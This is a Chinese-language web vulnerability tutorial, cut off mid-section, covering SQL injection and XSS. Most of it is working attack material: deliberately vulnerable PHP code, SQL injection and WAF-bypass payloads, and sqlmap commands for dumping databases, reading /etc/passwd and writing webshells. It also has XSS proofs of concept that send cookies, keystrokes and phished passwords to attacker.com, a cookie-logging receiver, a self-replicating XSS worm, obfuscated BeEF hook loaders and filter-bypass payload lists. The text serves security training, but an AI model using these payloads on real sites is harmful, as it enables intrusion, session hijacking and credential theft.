# 核心 Web 漏洞

> 本文档系统介绍 Web 应用中最常见的核心漏洞，包括原理、利用方式、典型场景和防护方法。每个漏洞均配有示例代码，帮助理解和复现。

---

## 目录

- [第一章：漏洞分类与概述](#第一章漏洞分类与概述)
- [第二章：SQL 注入](#第二章sql-注入)
- [第三章：XSS 跨站脚本](#第三章xss-跨站脚本)
- [第四章：CSRF 跨站请求伪造](#第四章csrf-跨站请求伪造)
- [第五章：文件上传漏洞](#第五章文件上传漏洞)
- [第六章：文件包含漏洞](#第六章文件包含漏洞)
- [第七章：命令注入](#第七章命令注入)
- [第八章：代码执行](#第八章代码执行)
- [第九章：SSRF 服务端请求伪造](#第九章ssrf-服务端请求伪造)
- [第十章：XXE XML 外部实体注入](#第十章xxe-xml-外部实体注入)
- [第十一章：逻辑漏洞](#第十一章逻辑漏洞)
- [第十二章：其他常见漏洞](#第十二章其他常见漏洞)

---

## 第一章：漏洞分类与概述

### 1.1 OWASP Top 10

OWASP（开放式 Web 应用程序安全项目）每几年发布一次 Top 10 最严重的 Web 应用安全风险：

| 2021 版 | 漏洞名称 | 说明 |
|--------|---------|------|
| A01 | **失效的访问控制** | 权限绕过、越权访问 |
| A02 | **加密机制失效** | 敏感数据明文传输/存储 |
| A03 | **注入** | SQL、NoSQL、OS 命令注入等 |
| A04 | **不安全设计** | 设计层面的安全缺陷 |
| A05 | **安全配置错误** | 默认配置、不必要的功能 |
| A06 | **自带缺陷和过时的组件** | 第三方组件漏洞 |
| A07 | **识别和身份验证失败** | 弱密码、会话固定等 |
| A08 | **软件和数据完整性失效** | CI/CD 流水线不安全 |
| A09 | **安全日志和监控失效** | 缺乏日志和告警 |
| A10 | **服务端请求伪造** | SSRF |

### 1.2 漏洞分类

```
注入类
├── SQL 注入
├── 命令注入
├── 代码执行
├── NoSQL 注入
├── LDAP 注入
├── XXE 注入
└── SSTI 模板注入

客户端漏洞
├── XSS（反射型、存储型、DOM 型）
├── CSRF
├── 点击劫持
└── CORS 配置错误

文件相关
├── 文件上传
├── 文件包含（LFI/RFI）
├── 任意文件读取
├── 任意文件删除
└── 目录遍历

权限相关
├── 水平越权
├── 垂直越权
├── 未授权访问
└── 会话管理漏洞

逻辑漏洞
├── 支付逻辑
├── 验证码绕过
├── 密码找回漏洞
└── 业务流程绕过

其他
├── SSRF
├── 反序列化
├── 弱口令
├── 信息泄露
└── 中间件漏洞
```

---

## 第二章：SQL 注入

详见 `database/数据库安全.md` 中的详细介绍。

**核心要点**：
- 原理：用户输入被拼接到 SQL 语句中执行
- 类型：联合查询、报错注入、布尔盲注、时间盲注、堆叠注入
- 防护：参数化查询（PreparedStatement）、输入验证、最小权限

### 🛠️ 补充：实战拓展

#### 一、PHP+MySQL 有漏洞代码示例

以下是真实环境中常见的 SQL 注入漏洞代码（PHP + MySQL），可用于本地搭建测试环境。

**1. 数字型注入（article.php）**

```php
<?php
/**
 * 数字型 SQL 注入漏洞示例
 * 漏洞点：$id 直接拼接到 SQL 语句中
 */
$conn = mysqli_connect("localhost", "root", "password", "sqli_demo");
if (!$conn) die("数据库连接失败");

$id = $_GET['id'];  // 用户可控，未经过滤
$sql = "SELECT * FROM articles WHERE id = $id";
$result = mysqli_query($conn, $sql);

if ($result && mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        echo "标题: " . $row['title'] . "<br>";
        echo "内容: " . $row['content'] . "<br>";
    }
} else {
    echo "文章不存在";
}
mysqli_close($conn);
?>
```

**利用方式**：
```
/article.php?id=1 AND 1=1              # 正常
/article.php?id=1 AND 1=2              # 异常 → 存在注入
/article.php?id=-1 UNION SELECT 1,version(),database(),4  # 联合查询
/article.php?id=1 AND SLEEP(5)         # 时间盲注测试
```

**2. 字符型注入（user.php）**

```php
<?php
/**
 * 字符型 SQL 注入漏洞示例
 * 漏洞点：用户名用单引号包裹，可逃逸单引号注入
 */
$conn = mysqli_connect("localhost", "root", "password", "sqli_demo");
$username = $_GET['username'];  // 用户可控

$sql = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $sql);

if ($result && $row = mysqli_fetch_assoc($result)) {
    echo "用户: " . $row['username'] . "<br>";
    echo "邮箱: " . $row['email'] . "<br>";
} else {
    echo "用户不存在";
}
mysqli_close($conn);
?>
```

**利用方式**：
```
/user.php?username=admin' --                     # 注释掉后面的单引号
/user.php?username=' UNION SELECT 1,2,3,4,5 #    # 联合查询注入
/user.php?username=' AND 1=2 UNION SELECT ... #  # 报错注入
```

**3. 搜索型注入（search.php）**

```php
<?php
/**
 * 搜索型 SQL 注入漏洞示例
 * 漏洞点：LIKE 查询中直接拼接关键字
 */
$conn = mysqli_connect("localhost", "root", "password", "sqli_demo");
$keyword = $_GET['keyword'];

$sql = "SELECT * FROM articles WHERE title LIKE '%$keyword%'";
$result = mysqli_query($conn, $sql);

echo "搜索结果：<br>";
while ($row = mysqli_fetch_assoc($result)) {
    echo $row['title'] . "<br>";
}
mysqli_close($conn);
?>
```

**利用方式**：
```
/search.php?keyword=' UNION SELECT 1,version(),3,4%23
/search.php?keyword=test' AND updatexml(1,concat(0x7e,version()),1)%23
```

**4. 登录注入（login.php 真实版）**

```php
<?php
/**
 * 登录 SQL 注入漏洞（真实 MySQL 环境）
 */
session_start();
$conn = mysqli_connect("localhost", "root", "password", "sqli_demo");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // 漏洞：直接拼接，无任何过滤
    $sql = "SELECT * FROM users WHERE username='$username' AND password='$password' LIMIT 1";
    $result = mysqli_query($conn, $sql);

    if ($result && $user = mysqli_fetch_assoc($result)) {
        $_SESSION['user'] = $user;
        echo "登录成功，欢迎 " . $user['username'];
    } else {
        echo "用户名或密码错误";
    }
}
mysqli_close($conn);
?>
```

**万能密码 Payload**：
```
用户名: ' OR 1=1 #
密码: 任意

用户名: admin' -- 
密码: 任意

用户名: ' UNION SELECT 1,'admin','123','a@b.com','admin' #
密码: 任意
```

#### 二、sqlmap 常用命令速查表

**基础使用**

```bash
# 检测注入点
sqlmap -u "http://target.com/article.php?id=1"

# 指定注入参数
sqlmap -u "http://target.com/article.php?id=1" -p id

# POST 请求注入（从 Burp 保存的请求文件）
sqlmap -r request.txt

# POST 请求注入（指定 data）
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123"

# Cookie 注入
sqlmap -u "http://target.com/" --cookie="id=1" --level 2

# User-Agent 注入
sqlmap -u "http://target.com/" --user-agent="sqlmap*" --level 3
```

**获取信息**

```bash
# 获取所有数据库
sqlmap -u "http://target.com/article.php?id=1" --dbs

# 获取当前数据库
sqlmap -u "http://target.com/article.php?id=1" --current-db

# 获取当前用户
sqlmap -u "http://target.com/article.php?id=1" --current-user

# 获取数据库表
sqlmap -u "http://target.com/article.php?id=1" -D sqli_demo --tables

# 获取表的列
sqlmap -u "http://target.com/article.php?id=1" -D sqli_demo -T users --columns

# 脱库（获取所有数据）
sqlmap -u "http://target.com/article.php?id=1" -D sqli_demo -T users --dump

# 只获取指定列
sqlmap -u "http://target.com/article.php?id=1" -D sqli_demo -T users -C username,password --dump
```

**注入技术指定**

```bash
# 指定注入技术：B(布尔) E(报错) U(联合) S(堆叠) T(时间) Q(内联)
sqlmap -u "http://target.com/?id=1" --technique=U
sqlmap -u "http://target.com/?id=1" --technique=BEUST

# 联合查询指定列数
sqlmap -u "http://target.com/?id=1" --union-cols 4-10

# 时间盲注
sqlmap -u "http://target.com/?id=1" --technique=T --time-sec 5
```

**高级功能**

```bash
# 操作系统交互（需要 DBA 权限）
sqlmap -u "http://target.com/?id=1" --os-shell

# 读取文件
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"

# 写入文件（写 Webshell）
sqlmap -u "http://target.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# SQL Shell
sqlmap -u "http://target.com/?id=1" --sql-shell

# 搜索所有库的所有表
sqlmap -u "http://target.com/?id=1" --search -T user%

# 批量扫描 URL 列表
sqlmap -m urls.txt --batch
```

**绕过与优化**

```bash
# 指定数据库类型
sqlmap -u "http://target.com/?id=1" --dbms=mysql

# 随机 User-Agent
sqlmap -u "http://target.com/?id=1" --random-agent

# 延迟请求（防封）
sqlmap -u "http://target.com/?id=1" --delay 1

# 线程数
sqlmap -u "http://target.com/?id=1" --threads 10

# 自动确认（非交互模式）
sqlmap -u "http://target.com/?id=1" --batch

# 绕过 WAF 的 tamper 脚本
sqlmap -u "http://target.com/?id=1" --tamper=space2comment
sqlmap -u "http://target.com/?id=1" --tamper=apostrophemask,space2comment
sqlmap -u "http://target.com/?id=1" --tamper=charencode  # URL编码

# 常用 tamper 脚本组合
sqlmap -u "http://target.com/?id=1" --tamper="between,randomcase,space2comment"
```

**常用 Tamper 脚本清单**

| 脚本名 | 作用 | 适用场景 |
|--------|------|----------|
| `apostrophemask` | 将单引号替换为 UTF-8 编码 | 过滤单引号时 |
| `base64encode` | Base64 编码 | 参数需 Base64 时 |
| `between` | 用 BETWEEN 替换 `=` 和 `>` | 过滤等号和比较符时 |
| `charencode` | URL 编码全部字符 | 基础 WAF 绕过 |
| `charunicodeencode` | Unicode 编码 | Unicode 编码绕过 |
| `equaltolike` | 用 LIKE 替换 `=` | 过滤等号时 |
| `greatest` | 用 GREATEST 替换 `>` | 过滤大于号时 |
| `ifnull2ifisnull` | 用 IFNULL 替换 IF IS NULL | 过滤 IFNULL 时 |
| `modsecurityversioned` | 空格+注释绕过 ModSecurity | ModSecurity WAF |
| `multiplespaces` | 多空格替换单空格 | 空格去重过滤时 |
| `nonrecursivereplacement` | 双写绕过 | WAF 只替换一次时 |
| `randomcase` | 随机大小写 | 大小写不敏感过滤时 |
| `space2comment` | 空格替换为 `/**/` | 过滤空格时 |
| `space2dash` | 空格替换为 `--`+换行 | 过滤空格时 |
| `space2hash` | 空格替换为 `#`+换行 | 过滤空格时 |
| `space2morehash` | 空格替换为 `#`+更多内容 | 过滤空格时 |
| `space2mssqlblank` | 空格替换为其他空白字符 | SQL Server |
| `unionalltounion` | UNION ALL 替换为 UNION | 过滤 ALL 时 |
| `unmagicquotes` | 宽字节注入绕过 magic_quotes | PHP magic_quotes |
| `uppercase` | 全大写 | 仅过滤小写关键字时 |
| `versionedkeywords` | 用注释包裹关键字 MySQL 版本化 | MySQL WAF |

#### 三、SQL 注入绕过 WAF 技巧

**1. 注释绕过**

```sql
-- 基础注释
SELECT * FROM users WHERE id = 1 -- comment
SELECT * FROM users WHERE id = 1 # comment

-- 内联注释绕过（MySQL 特有）
SELECT /*!50000UNION*/ /*!50000SELECT*/ 1,2,3
/*!UNION*//*!SELECT*/ 1,2,3

-- 多行注释绕过空格
SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1

-- 嵌套注释
SELECT/*/*f*/ROM*/ users
```

**2. 空格绕过**

```sql
-- 使用注释代替空格
SELECT/**/*/**/FROM/**/users

-- 使用括号
SELECT(id)FROM(users)WHERE(id=1)

-- 使用 Tab (%09)、换行 (%0a)、回车 (%0d)
SELECT%09*%0AFROM%0Dusers

-- 使用反引号
SELECT`id`FROM`users`

-- 使用浮点数
SELECT * FROM users WHERE id=1.0
```

**3. 大小写绕过**

```sql
-- 随机大小写组合
sElEcT * FrOm users WheRe id=1

-- 全大写
SELECT * FROM USERS WHERE ID=1

-- 混合特殊写法
SeLeCt 1,2,3 FrOm InFoRmAtIoN_ScHeMa.TaBlEs
```

**4. 关键字绕过（双写/等价替换）**

```sql
-- 双写绕过（WAF 只替换一次）
UNIunionON SELselectECT 1,2,3
SELSELECTECT * FROM users
OORR 1=1

-- 等价函数替换
sleep(5)    → benchmark(10000000,MD5(1))
hex()       → ascii() → ord()
substring() → mid() → substr()
concat()    → group_concat() → concat_ws()
and         → &&
or          → ||

-- 等价运算符
=           → LIKE → REGEXP → BETWEEN
>           → GREATEST(a,b)=a
<           → LEAST(a,b)=a
```

**5. 编码绕过**

```sql
-- URL 编码（双层编码）
?id=1%20UNION%20SELECT%201,2,3
?id=1%2520UNION%2520SELECT%25201,2,3  # 双重URL编码

-- Unicode 编码
?id=1%u0055NION%u0053ELECT 1,2,3

-- HTML 实体编码
&#85;&#78;&#73;&#79;&#78; = UNION

-- 十六进制
?id=1 and 0x75=0x75  -- 比较十六进制值
```

**6. 特殊字符绕过**

```sql
-- 反引号绕过
SELECT `username` FROM `users` WHERE `id`=1

-- 科学计数法
?id=1e0 UNION SELECT 1,2,3

-- N+字符
?id=1 UNION SELECT N'1',N'2',N'3'  -- SQL Server

-- 使用 @ 变量
SET @sql=CONCAT('SEL','ECT * FROM users'); PREPARE stmt FROM @sql; EXECUTE stmt;
```

**7. 逻辑绕过**

```sql
-- 用数学运算替代 AND/OR
?id=1 AND 1=1    → ?id=1 && 1=1
?id=1 OR 1=1     → ?id=1 || 1=1

-- 用异或
?id=1 XOR 1=2    -- 1 XOR 0 = 1，为真

-- 用 NOT
?id=1 NOT IN (2)
```

**8. HTTP 参数污染 (HPP)**

```
# 重复参数，后端可能拼接或取最后一个
?id=1&id=2 UNION SELECT 1,2,3

# 参数名大小写不同（后端可能合并）
?Id=1 UNION SELECT 1,2,3
?id=1
```

**9. 分块传输绕过**

```http
POST /target HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

5
id=1%
a
20UNION
d
%20SELECT
...
```

---

## 第三章：XSS 跨站脚本

### 3.1 漏洞原理

XSS（Cross-Site Scripting）是注入攻击的一种，攻击者在网页中注入恶意脚本，当用户访问页面时脚本执行，从而窃取 Cookie、钓鱼、劫持会话等。

**根本原因**：用户输入未经过滤直接输出到 HTML 页面，浏览器将其当作脚本执行。

### 3.2 XSS 分类

| 类型 | 说明 | 特点 |
|------|------|------|
| **反射型 XSS** | 恶意脚本在 URL 中，服务端反射输出 | 一次性，需要诱导用户点击 |
| **存储型 XSS** | 恶意脚本存入数据库，所有访问者触发 | 危害大，自动触发 |
| **DOM 型 XSS** | 前端 JS 直接操作 DOM，不经过服务端 | 纯前端漏洞，服务端无痕迹 |

### 3.3 反射型 XSS

**漏洞代码**（PHP）：
```php
<?php
// search.php
$keyword = $_GET['keyword'];
echo "<p>搜索结果：" . $keyword . "</p>";
?>
```

**利用**：
```
http://example.com/search.php?keyword=<script>alert(document.cookie)</script>
```

### 3.4 存储型 XSS

**漏洞代码**：
```php
<?php
// 留言板，直接将用户留言存入数据库并输出
$message = $_POST['message'];
// 存入数据库...
// 然后输出
echo "<div class='message'>" . $message . "</div>";
?>
```

**利用**：在留言框提交：
```html
<script>
// 窃取 Cookie 发送到攻击者服务器
var img = new Image();
img.src = "http://attacker.com/steal.php?c=" + document.cookie;
</script>
```

### 3.5 DOM 型 XSS

**漏洞代码**：
```html
<script>
    // 从 URL 获取参数，直接写入页面
    var name = location.hash.substring(1);
    document.getElementById("greet").innerHTML = "你好, " + name;
</script>
<div id="greet"></div>
```

**利用**：
```
http://example.com/index.html#<img src=x onerror=alert(1)>
```

### 3.6 XSS 常用 Payload

```html
<!-- 基础弹窗 -->
<script>alert(1)</script>

<!-- 标签事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 伪协议 -->
<a href="javascript:alert(1)">点击</a>
<iframe src="javascript:alert(1)"></iframe>

<!-- 窃取 Cookie -->
<script>
document.location='http://attacker.com/steal.php?c='+document.cookie
</script>

<script>
new Image().src='http://attacker.com/steal.php?c='+document.cookie
</script>

<!-- 键盘记录 -->
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/key.php?k=' + e.key;
}
</script>

<!-- 钓鱼：伪造登录框 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
     background:rgba(0,0,0,0.5);z-index:9999;display:flex;
     justify-content:center;align-items:center;">
    <div style="background:white;padding:30px;border-radius:5px;">
        <h3>登录过期，请重新登录</h3>
        <form action="http://attacker.com/phish.php">
            <input type="text" name="user" placeholder="用户名"><br>
            <input type="password" name="pass" placeholder="密码"><br>
            <button type="submit">登录</button>
        </form>
    </div>
</div>
```

### 3.7 XSS 绕过技巧

```html
<!-- 大小写绕过 -->
<IMG SRC=X ONERROR=alert(1)>

<!-- 双写绕过 -->
<scrscriptipt>alert(1)</scrscriptipt>

<!-- 编码绕过 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- 空格绕过 -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- 事件绕过（过滤 script 时） -->
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>

<!-- 协议绕过 -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
```

### 3.8 防护方法

1. **输入过滤**：对用户输入进行过滤或转义
2. **输出编码**：根据输出上下文进行正确编码
   - HTML 上下文：`htmlspecialchars()` 转义 `< > " ' &`
   - JS 上下文：Unicode 编码
   - URL 上下文：URL 编码
3. **HttpOnly Cookie**：Cookie 设置 HttpOnly，防止 JS 读取
4. **CSP 内容安全策略**：限制脚本来源和执行
5. **输入长度限制**：合理限制输入长度
6. **使用模板引擎自动转义**：Vue、React 等默认转义

**CSP 示例**：
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 🛠️ 补充：实战拓展

#### 一、三种 XSS 类型完整 PoC 代码

**1. 反射型 XSS 完整 PoC（窃取 Cookie 并发送到攻击者服务器）**

```html
<!-- PoC 1: 基础弹窗验证 -->
http://target.com/search.php?keyword=<script>alert(document.domain)</script>

<!-- PoC 2: 窃取 Cookie（图片外带） -->
http://target.com/search.php?keyword=<img src=x onerror="this.src='http://attacker.com/steal.php?c='+document.cookie">

<!-- PoC 3: 窃取 Cookie（AJAX 异步发送） -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?c=' + document.cookie, true);
xhr.send();
</script>

<!-- PoC 4: 键盘记录器 -->
<script>
document.onkeypress = function(e) {
    var img = new Image();
    img.src = 'http://attacker.com/key.php?k=' + encodeURIComponent(e.key);
};
</script>

<!-- PoC 5: 页面重定向（钓鱼跳转） -->
<script>location.href='http://attacker.com/phish.html?c='+document.cookie</script>
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish.html">

<!-- PoC 6: 伪造登录框（钓鱼） -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:99999;display:flex;justify-content:center;align-items:center;">
  <div style="background:#fff;padding:30px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.3);">
    <h3 style="margin-top:0;">登录已过期，请重新登录</h3>
    <form onsubmit="steal();return false;">
      <p><input type="text" id="u" placeholder="用户名" style="width:200px;padding:8px;"></p>
      <p><input type="password" id="p" placeholder="密码" style="width:200px;padding:8px;"></p>
      <p><button type="submit" style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;">登录</button></p>
    </form>
  </div>
</div>
<script>
function steal(){
  var u=document.getElementById('u').value;
  var p=document.getElementById('p').value;
  new Image().src='http://attacker.com/phish.php?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p);
  alert('登录失败，请重试');
}
</script>
```

**攻击者接收端（steal.php）**：
```php
<?php
// 窃取的 Cookie 保存到文件
$cookie = $_GET['c'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'N/A';

$log = "[{$time}] IP:{$ip} | Referer:{$ref} | Cookie:{$cookie}\n";
file_put_contents('cookies.txt', $log, FILE_APPEND);

// 返回 1x1 透明图片
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
```

**2. 存储型 XSS 完整 PoC（持久化控制）**

```html
<!-- PoC 1: 基础存储型弹窗 -->
<script>alert('存储型XSS，所有访问者都会触发')</script>

<!-- PoC 2: 会话劫持（窃取 Cookie） -->
<script>
(function(){
    var img = document.createElement('img');
    img.src = 'http://attacker.com/steal.php?c=' + document.cookie + '&url=' + encodeURIComponent(location.href);
    img.style.display = 'none';
    document.body.appendChild(img);
})();
</script>

<!-- PoC 3: BeEF Hook（勾连浏览器） -->
<script src="http://attacker.com:3000/hook.js"></script>

<!-- PoC 4: 蠕虫式传播（自我复制到留言板） -->
<script>
(function(){
    // 自动提交包含自身的 XSS Payload 到留言板
    var payload = '<script src="http://attacker.com/worm.js"><\/script>';
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://target.com/message.php';
    var input = document.createElement('textarea');
    input.name = 'message';
    input.value = payload + '\n 这是一条正常留言';
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
})();
</script>

<!-- PoC 5: CSRF + XSS 组合攻击（以用户身份发请求） -->
<script>
// 使用受害者身份执行敏感操作
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/change_email.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send('email=hacker@evil.com');
</script>
```

**3. DOM 型 XSS 完整 PoC（纯前端漏洞）**

```html
<!-- PoC 1: innerHTML 注入 -->
http://target.com/index.html#<img src=x onerror=alert(1)>

<!-- PoC 2: document.write 注入 -->
http://target.com/index.html?name=<script>alert(1)</script>

<!-- PoC 3: eval 注入（计算器功能） -->
http://target.com/calc.html?exp=alert(document.cookie)

<!-- PoC 4: location.href 跳转注入 -->
http://target.com/redirect.html?url=javascript:alert(1)

<!-- PoC 5: setTimeout/setInterval 字符串注入 -->
http://target.com/delay.html?callback=alert(1)

<!-- PoC 6: postMessage 漏洞 -->
<!-- 攻击者页面发送恶意消息 -->
<script>
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
</script>
<!-- 目标页面接收并写入DOM（漏洞） -->
<script>
window.addEventListener('message', function(e) {
    document.getElementById('msg').innerHTML = e.data; // 危险！
});
</script>
```

#### 二、BeEF 工具使用指南

**BeEF（The Browser Exploitation Framework）** 是一款专注于 Web 浏览器端攻击的渗透测试框架，通过 XSS 漏洞勾连浏览器后，可以对受害浏览器进行各种操作。

**1. 安装与启动**

```bash
# Kali Linux 安装
apt install beef-xss

# 启动 BeEF
beef-xss

# 或从源码安装
git clone https://github.com/beefproject/beef.git
cd beef
./install
./beef
```

**默认访问地址**：
- 管理面板：`http://127.0.0.1:3000/ui/panel`
- Hook 脚本：`http://127.0.0.1:3000/hook.js`
- 默认账号：`beef / beef`

**2. 基本使用流程**

```
步骤 1: 启动 BeEF 服务
步骤 2: 将 hook.js 通过 XSS 注入到目标页面
        <script src="http://your-ip:3000/hook.js"></script>
步骤 3: 受害者访问含 XSS 的页面，浏览器被勾连
步骤 4: 在 BeEF 管理面板查看在线僵尸浏览器
步骤 5: 选择目标浏览器，执行各种命令模块
```

**3. 常用模块清单**

| 模块分类 | 模块名 | 功能说明 |
|----------|--------|----------|
| **信息收集** | Browser Fingerprinting | 浏览器指纹识别（类型、版本、插件等） |
| | Get Cookie | 获取当前页面 Cookie |
| | Get Page HTML | 获取当前页面完整 HTML |
| | Get Local Storage | 获取 localStorage 数据 |
| | Get Session Storage | 获取 sessionStorage 数据 |
| | Get All Links | 提取页面所有链接 |
| | Detect Social Engineering | 检测已登录的社交网站 |
| **劫持操作** | Redirect Browser | 重定向浏览器到指定 URL |
| | Tabnabbing | 标签页劫持（后台替换） |
| | Create Foreground iFrame | 创建前台 iframe |
| | Replace HREFs | 替换页面所有链接 |
| | Browser Autopwn | 浏览器自动攻击（尝试漏洞利用） |
| **社会工程** | Pretty Theft | 精美的登录框钓鱼（弹窗式） |
| | Simple Hijacker | 简单弹窗劫持 |
| | Clippy | 模拟 Clippy 助手钓鱼 |
| | Fake Flash Update | 伪造 Flash 更新弹窗 |
| | Fake Notification Bar | 伪造通知栏 |
| **网络探测** | Ping Sweep | 内网 IP 存活探测 |
| | Port Scanner | 内网端口扫描 |
| | Cross-Origin Scanner | 跨域扫描内网资源 |
| | DNS Enumeration | DNS 枚举 |
| **持久化** | Confirm Close Tab | 阻止用户关闭标签页 |
| | Man In The Browser | 中间人浏览器（拦截请求） |
| | Persistence | 持久化模块（弹窗重连等） |
| **数据窃取** | Grab Google Contacts | 窃取 Google 联系人 |
| | Screenshot | 页面截图（需 Canvas） |
| | Keylogger | 键盘记录器 |
| | Clipboard Theft | 剪贴板内容窃取 |

**4. 高级使用技巧**

```bash
# 修改默认配置
vim /etc/beef-xss/config.yaml
# 或
vim beef/config.yaml

# 关键配置项
# http:
#   host: "0.0.0.0"       # 监听地址
#   port: "3000"           # 监听端口
#   public: "1.2.3.4"      # 公网IP（用于反向代理）

# 扩展模块目录
ls /usr/share/beef-xss/modules/
# 或
ls beef/modules/
```

**隐藏 Hook 痕迹**：
```javascript
// 方式1: 动态创建 script 标签
<script>
var s = document.createElement('script');
s.src = 'http://attacker.com:3000/hook.js';
s.style.display = 'none';
document.body.appendChild(s);
</script>

// 方式2: 使用 XMLHttpRequest 加载并 eval
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com:3000/hook.js', true);
xhr.onload = function() { eval(xhr.responseText); };
xhr.send();
</script>

// 方式3: 编码混淆
<script>eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7...'))</script>
```

**5. 自定义命令模块**

```javascript
// 自定义模块示例：获取页面表单数据
// 保存到 beef/modules/custom/get_forms/command.js

beef.execute(function() {
    var forms = document.forms;
    var result = [];
    for (var i = 0; i < forms.length; i++) {
        var form = { action: forms[i].action, fields: [] };
        var inputs = forms[i].getElementsByTagName('input');
        for (var j = 0; j < inputs.length; j++) {
            form.fields.push({
                name: inputs[j].name,
                type: inputs[j].type,
                value: inputs[j].value
            });
        }
        result.push(form);
    }
    beef.net.send("http://attacker.com:3000/up", result);
});
```

#### 三、XSS 过滤绕过 Payload 清单

**1. 基础绕过**

```html
<!-- 大小写绕过 -->
<IMG SRC=X ONERROR=alert(1)>
<ScRiPt>alert(1)</ScRiPt>

<!-- 双写绕过（WAF 只过滤一次） -->
<scrscriptipt>alert(1)</scrscriptipt>
<imimgg src=x onerror=alert(1)>

<!-- 注释干扰 -->
<img src=x o<!--xxx-->nerror=alert(1)>
<scr<!--test-->ipt>alert(1)</script>

<!-- 空格替换 -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0Asrc=x%0Aonerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
```

**2. 标签事件绕过（过滤 script 时）**

```html
<!-- 常用事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<select onchange=alert(1) autofocus>
<video onerror=alert(1)><source>
<audio onerror=alert(1)><source>
<body onpageshow=alert(1)>
<iframe onload=alert(1) src=x>

<!-- 鼠标事件（需交互） -->
<div onmouseover=alert(1)>悬停我</div>
<div onclick=alert(1)>点击我</div>
<p onmousemove=alert(1)>移动鼠标</p>

<!-- 不常见但有效的事件 -->
<marquee onstart=alert(1)>x</marquee>
<keygen onfocus=alert(1) autofocus>
<isindex onfocus=alert(1) type=image>
<object data=x onerror=alert(1)>
<embed src=x onerror=alert(1)>
<applet code=x onerror=alert(1)>
```

**3. 协议绕过**

```html
<!-- javascript 伪协议 -->
<a href="javascript:alert(1)">点击</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><button>提交</button></form>

<!-- data 协议 -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
<object data="data:text/html,<script>alert(1)</script>">

<!-- vbscript（仅 IE） -->
<img src=x onerror="vbscript:msgbox 1">

<!-- 利用 meta 标签跳转 -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

**4. 编码绕过**

```html
<!-- HTML 实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">

<!-- Unicode 编码（JS 上下文中） -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- URL 编码 -->
<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>

<!-- Base64 编码 -->
<script>eval(atob('YWxlcnQoMSk='))</script>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- 八进制编码 -->
<script>eval('\141\154\145\162\164\50\61\51')</script>

<!-- 十六进制编码 -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

<!-- 混合编码 -->
<img src=x onerror="&#97;&#108;ert(1)">
```

**5. 关键字绕过**

```html
<!-- 字符串拼接 -->
<img src=x onerror="a='aler';b='t';a=b+a;a(1)">
<img src=x onerror="window['ale'+'rt'](1)">

<!-- 数组方式 -->
<img src=x onerror="window['al'+'ert'](1)">
<script>[].constructor.constructor('alert(1)')()</script>

<!-- 反引号模板字符串（ES6） -->
<img src=x onerror=alert`1`>
<svg onload=alert`XSS`>

<!-- Function 构造器 -->
<img src=x onerror="Function('alert(1)')()">

<!-- setTimeout/setInterval -->
<img src=x onerror="setTimeout('alert(1)',0)">
<img src=x onerror="setInterval('alert(1)',1000)">

<!-- 利用 location.hash 传参 -->
<script>eval(location.hash.substr(1))</script>
<!-- URL 中添加 #alert(1) -->

<!-- 利用 name 属性 -->
